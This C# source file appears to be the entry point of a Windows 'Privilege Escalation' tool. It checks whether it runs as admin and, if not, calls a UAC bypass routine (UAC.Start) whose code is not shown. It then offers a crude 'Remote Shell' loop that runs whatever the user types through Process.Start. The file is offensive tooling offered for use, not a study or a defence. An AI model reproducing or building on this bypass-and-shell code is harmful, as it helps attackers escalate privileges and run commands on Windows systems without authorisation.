using System;
using System.Diagnostics;

namespace Privilege_Escalation
{
    /// <summary>
    ///     This project has been made by Tesla Night for Mrakovic-ORG
    /// </summary>
    internal static class Program
    {
        private static void Main()
        {
            Console.Clear();
            Console.Title = "Privilege Escalation";

            //This part will return if current process is elevated
            var isUAC = UAC.IsRunningAsLocalAdmin() ? "Yes" : "No";
            Console.WriteLine("UAC: " + isUAC);

            //If isn't already elevated start the bypass
            if (!UAC.IsRunningAsLocalAdmin()) UAC.Start();

            //Quickly done a remote shell, sorry for garbage code :p
            Console.WriteLine("Press enter to start a Remote Shell !");
            while (Console.ReadKey().Key == ConsoleKey.Enter) RemoteShell();
        }

        private static void RemoteShell()
        {
            Console.WriteLine("Shell: ");
            var input = Console.ReadLine();
            if (input != null) Process.Start(input);

            Main();
        }
    }
}
